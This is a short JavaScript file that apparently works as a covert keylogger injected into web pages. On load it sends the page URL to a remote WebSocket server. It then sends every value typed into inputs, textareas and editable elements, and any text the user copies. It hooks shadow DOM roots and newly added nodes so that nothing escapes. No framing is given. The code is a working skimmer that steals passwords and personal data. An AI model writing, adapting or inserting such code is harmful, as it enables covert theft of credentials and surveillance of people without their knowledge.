const ws = new WebSocket('wss://websocket-production-1b1d.up.railway.app');


ws.onopen = () => {
    // ws.send('Hello WebSocket!');
};

ws.onmessage = (event) => {
};

ws.onerror = (error) => {
};

ws.onclose = () => {
};

function send(data) {
    setTimeout(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data);
        } else {
            console.warn('WebSocket is not open. Ready state:', ws.readyState);
        }
    }
        , 1000);

}




const now = new Date().toISOString();
send(`[${now}] Path::` + window.location.href);

function bindInputLogger(root) {
    root.addEventListener('input', function (event) {
        const target = event.target;
        const tag = target.tagName?.toUpperCase();
        if (tag === 'INPUT' || tag === 'TEXTAREA' || target.isContentEditable) {


            const now = new Date().toISOString();
            send(`[${now}] Typed::` + target.value || target.textContent);
        }
    }, true);
}

// 👇 Clipboard logging via key detection
function bindClipboardLogger(root) {
    root.addEventListener('keydown', function (event) {
        const isMac = navigator.platform.toUpperCase().indexOf('MAC') >= 0;
        const ctrlKey = isMac ? event.metaKey : event.ctrlKey;

        if (ctrlKey && event.key === 'c') {
            let selection = window.getSelection();
            if (selection && selection.toString().trim()) {

                const now = new Date().toISOString();
                send(`[${now}] Copied::${selection.toString()}`);
            }
        }
    }, true);
}

// Main doc
bindInputLogger(document);
bindClipboardLogger(document);

// Shadow DOM
function hookShadowRoots(node) {
    if (!node || !node.querySelectorAll) return;

    const elements = node.querySelectorAll('*');
    elements.forEach(el => {
        if (el.shadowRoot) {
            bindInputLogger(el.shadowRoot);
            bindClipboardLogger(el.shadowRoot);
            hookShadowRoots(el.shadowRoot);
        }
    });
}

hookShadowRoots(document);

const observer = new MutationObserver(mutations => {
    mutations.forEach(m => {
        m.addedNodes.forEach(node => hookShadowRoots(node));
    });
});
observer.observe(document.body, { childList: true, subtree: true });


